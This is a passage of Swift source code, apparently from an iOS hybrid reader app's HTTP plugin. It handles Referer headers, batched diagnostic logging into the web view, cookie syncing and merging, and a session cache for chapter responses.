           let json = try? JSONSerialization.data(withJSONObject: data) {
            if headers["Content-Type"] == nil, headers["content-type"] == nil {
                headers["Content-Type"] = "application/json; charset=utf-8"
            }
            return json
        }

        return nil
    }

    // MARK: - Referer

    /// Browsers send the current document URL as Referer. The site's read
    /// endpoints validate it, so prefer the web view's URL over a bare origin.
    /// Must be called on the main thread.
    private func pageReferer(for url: URL) -> String {
        if let page = self.bridge?.webView?.url?.absoluteString, !page.isEmpty {
            return page
        }
        if let scheme = url.scheme, let host = url.host {
            return "\(scheme)://\(host)/"
        }
        return ""
    }

    // MARK: - Diagnostics

    /// Lines waiting for the next runloop turn. One `evaluateJavaScript` per
    /// runloop turn instead of one per request: on a list page that is dozens of
    /// cross-process hops collapsed into a handful. `pendingForced` records
    /// whether any of them must survive the panel being switched off.
    private var pendingLines: [String] = []
    private var pendingForced = false

    /// Push one line into the in-page diagnostic panel installed by
    /// SangTacAppPlugin (window.__stvDiag). Silent when the panel is absent.
    ///
    /// `force` is for failures: a 4xx/5xx or a transport error is sent even with
    /// the panel switched off, and the JS side keeps those lines in its buffer
    /// without rendering them, so "why did that fail?" is still there if the
    /// reader turns logging on afterwards.
    private func report(_ tag: String, _ message: String, force: Bool = false) {
        guard force || diagnosticsOn else { return }
        let line = "[\(tag)] " + SangTacHttpPlugin.redact(message)
        DispatchQueue.main.async { [weak self] in
            guard let self = self else { return }
            self.pendingLines.append(line)
            self.pendingForced = self.pendingForced || force
            // Only the first line of a turn schedules the flush; the rest ride
            // along in the same batch.
            guard self.pendingLines.count == 1 else { return }
            DispatchQueue.main.async { [weak self] in
                guard let self = self else { return }
                let batch = self.pendingLines
                let forced = self.pendingForced
                self.pendingLines = []
                self.pendingForced = false
                guard !batch.isEmpty else { return }
                let js = "window.__stvDiag && window.__stvDiag.logBatch("
                    + SangTacHttpPlugin.jsArrayLiteral(batch)
                    + (forced ? ",true" : "") + ");"
                self.bridge?.webView?.evaluateJavaScript(js, completionHandler: nil)
            }
        }
    }

    /// A JSON array of strings is a valid JavaScript array literal, so the batch
    /// needs no hand-rolled escaping.
    private static func jsArrayLiteral(_ values: [String]) -> String {
        guard let data = try? JSONSerialization.data(withJSONObject: values),
              let text = String(data: data, encoding: .utf8) else {
            return "[]"
        }
        return text
    }

    /// One line of the response body, so a server-side error message is readable
    /// in the on-device panel instead of just "status 500".
    ///
    /// Bounded on purpose: chapter HTML is routinely 100KB+ and the panel keeps
    /// 240 characters, so decoding the whole body to then throw 99.8% of it away
    /// was pure waste -- and this used to run on every single request.
    ///
    /// `String(decoding:as:)` rather than `String(data:encoding:)`: a byte slice
    /// cuts UTF-8 characters in half on exactly the long CJK/Vietnamese bodies
    /// this exists for, and the failable initialiser answers `nil` -- an empty
    /// preview -- for the whole line.
    private static func preview(payload: Payload, body: Data) -> String {
        let source: String
        if let string = payload.value as? String {
            source = String(string.prefix(4096))
        } else {
            source = String(decoding: body.prefix(4096), as: UTF8.self)
        }
        let collapsed = source
            .split(whereSeparator: { $0.isNewline || $0 == "\t" })
            .joined(separator: " ")
        if collapsed.count <= 240 { return collapsed }
        return String(collapsed.prefix(240)) + "..."
    }

    // MARK: - Cookies

    /// Reads the snapshot when it is warm; otherwise falls back to the
    /// asynchronous store read and seeds the snapshot from its answer.
    private func nativeCookies(for url: URL?,
                               allowed: Bool = true,
                               _ completion: @escaping ([HTTPCookie]) -> Void) {
        guard allowed else {
            completion([])
            return
        }
        if let cached = snapshotCookies(for: url) {
            completion(cached)
            return
        }
        let generation = currentGeneration()
        DispatchQueue.main.async {
            WKWebsiteDataStore.default().httpCookieStore.getAllCookies { [weak self] cookies in
                self?.setSnapshot(cookies, issuedAt: generation)
                guard let url = url else {
                    completion(cookies)
                    return
                }
                completion(SangTacHttpPlugin.matching(cookies, host: url.host ?? ""))
            }
        }
    }

    private static func matching(_ cookies: [HTTPCookie], host: String) -> [HTTPCookie] {
        guard !host.isEmpty else { return cookies }
        return cookies.filter { cookie in
            let domain = cookie.domain.hasPrefix(".") ? String(cookie.domain.dropFirst()) : cookie.domain
            return host == domain || host.hasSuffix("." + domain)
        }
    }

    /**
     What makes two chapter answers the same answer, derived from the Cookie
     header the request actually carries.

     The translation-mode cookies (`transmode`, `foreignlang`) are written by the
     site immediately before every chapter read (`app.v2.read.js:965
     setTransMode`) and decide the language of the body, so they belong in the
     identity of the response. Taking them from the sent header -- rather than
     from the page's header or the native snapshot separately -- is what keeps the
     key honest, because those two sources can disagree and only the merged header
     is what the server will see.

     The session cookies deliberately do not contribute their values.
     `readcontextid` and friends are reissued by the server as reads progress, so
     keying on them would make the cache miss every time and buy nothing. Whether
     a session was present at all is kept, so signing out can never be served out
     of a signed-in cache.
     */
    private static func chapterVariant(_ sentCookieHeader: String?) -> String {
        var mode: [String: String] = [:]
        var signedIn = false
        for pair in (sentCookieHeader ?? "").split(separator: ";") {
            let trimmed = pair.trimmingCharacters(in: .whitespaces)
            let parts = trimmed.split(separator: "=", maxSplits: 1)
            guard let name = parts.first.map(String.init), !name.isEmpty else { continue }
            let value = parts.count > 1 ? String(parts[1]) : ""
            if name == "transmode" || name == "foreignlang" {
                mode[name] = value
            } else if name == "access" || name == "useri2" {
                signedIn = true
            }
        }
        // Fixed name order, so the key is deterministic without sorting.
        var ordered: [String] = []
        for name in ["transmode", "foreignlang"] {
            if let value = mode[name] { ordered.append(name + "=" + value) }
        }
        return ordered.joined(separator: ";") + "|" + (signedIn ? "in" : "out")
    }

    /// Answers from the session cache, rebuilt through the same
    /// `responsePayload` the network path uses: its typing is load-bearing (the
    /// reader calls `r.data.replace(...)` on a text/html body), so the cached
    /// bytes have to go through the identical branch.
    ///
    /// It reports to the panel like the network path does, because
    /// `[Http] sajax=readchapter ... (cache)` is how a cache hit is confirmed on a
    /// sideloaded build -- CAPLog is not readable there. `report` is gated on the
    /// diagnostics switch, so this costs nothing while logging is off.
    private func serveCached(_ cached: ResponseCache.Entry,
                             url: URL,
                             call: CAPPluginCall,
                             method: String,
                             elapsedMs: Int) {
        let payload = SangTacHttpPlugin.responsePayload(
            body: cached.body,
            contentType: cached.contentType,
            responseType: call.getString("responseType"))
        var result: [String: Any] = [
            "status": cached.status,
            "headers": cached.headers,
            "url": url.absoluteString,
            "data": payload.value
        ]
        if cached.status >= 400 { result["error"] = true }
        callLog("ok", "\(method) \(url.absoluteString) -> \(cached.status) "
            + "bytes=\(cached.body.count) data=\(payload.kind) (cache)")
        report("Http", "\(method) \(url.absoluteString) -> \(cached.status) "
            + "\(cached.contentType.isEmpty ? "no-content-type" : cached.contentType) "
            + "\(payload.kind) \(cached.body.count)b in \(elapsedMs)ms (cache)")
        call.resolve(result)
    }

    private func storeResponseCookies(_ response: HTTPURLResponse, for url: URL) {
        let headerFields = response.allHeaderFields.reduce(into: [String: String]()) { acc, pair in
            if let key = pair.key as? String { acc[key] = String(describing: pair.value) }
        }
        let cookies = HTTPCookie.cookies(withResponseHeaderFields: headerFields, for: url)
        guard !cookies.isEmpty else { return }
        // Update the snapshot synchronously: the observer is asynchronous, and a
        // login round trip must not have its very next request miss the session
        // cookie it just received.
        mergeSnapshot(cookies)
        DispatchQueue.main.async {
            let store = WKWebsiteDataStore.default().httpCookieStore
            for cookie in cookies {
                store.setCookie(cookie, completionHandler: nil)
                HTTPCookieStorage.shared.setCookie(cookie)
            }
        }
    }

    private static func mergeCookieHeader(jsHeader: String?, nativeCookies: [HTTPCookie]) -> String {
        var ordered: [String] = []
        var seen = Set<String>()
        for cookie in nativeCookies {
            if seen.insert(cookie.name).inserted {
                ordered.append("\(cookie.name)=\(cookie.value)")
            }
        }
        if let jsHeader = jsHeader {
            for pair in jsHeader.split(separator: ";") {
                let trimmed = pair.trimmingCharacters(in: .whitespaces)
                guard let name = trimmed.split(separator: "=").first.map(String.init), !name.isEmpty else { continue }
                if seen.insert(name).inserted {
                    ordered.append(trimmed)
                }
            }
        }
        return ordered.joined(separator: "; ")
    }

    private static func appendingQuery(_ params: [String: Any], to urlString: String) -> String {
        guard var components = URLComponents(string: urlString) else { return urlString }
        var items = components.queryItems ?? []
        for (key, value) in params where !(value is NSNull) {
            items.append(URLQueryItem(name: key, value: String(describing: value)))
        }
        components.queryItems = items
        return components.url?.absoluteString ?? urlString
    }

    private func callLog(_ tag: String, _ message: String) {
        CAPLog.print("[SangTacHttp:\(tag)] \(SangTacHttpPlugin.redact(message))")
    }
}
